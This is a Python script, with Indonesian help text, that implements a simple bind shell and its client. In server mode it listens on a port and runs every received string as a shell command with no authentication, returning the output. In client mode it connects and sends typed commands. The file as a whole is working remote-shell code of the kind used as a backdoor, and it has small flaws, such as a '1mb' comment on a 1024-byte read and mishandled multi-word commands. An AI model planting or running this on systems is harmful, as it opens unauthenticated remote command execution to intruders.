from subprocess import Popen, PIPE
import socket
import argparse

def exec_command(cmd):
    cmd = cmd.split(' ')
    pipe = Popen(cmd, stdin=PIPE,stdout=PIPE, stderr=PIPE, shell=True)
    err = pipe.stderr.read()
    output = pipe.stdout.read()
    return output + err

def shell_server(ip, port):
    serv = socket.socket()
    serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    serv.bind((ip, port))
    serv.listen(0)
    conn, addr= serv.accept()

    print('accepting connection from ', addr)
    while True:
        data = conn.recv(1024) # accept 1mb
        if not data:break
        str_data = data.decode()
        conn.sendall(exec_command(str_data))


def client(ip, port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.connect((ip, port))
    except socket.error as err:
        print(err)
    remote_host = s.getsockname()[0]
    while True:
        command = input(f'[+][{remote_host}]> ')
        s.sendall(command.encode())
        data = s.recv(65535)
        print(data.decode())



def main():
    parser = argparse.ArgumentParser(description='python3 shellsock digunakan untuk mengakses shell dari server')
    parser.add_argument('-t', metavar='TARGET', type=str, help='target host')
    parser.add_argument('-p', metavar='PORT', type=int, help='target port')
    parser.add_argument('-type', choices=['client', 'server'], help='pilihan client atau server')
    args = parser.parse_args()
    if args.type == 'client':
        client(args.t, args.p)
    else:
        shell_server(args.t, args.p)

if __name__ == '__main__':
    main()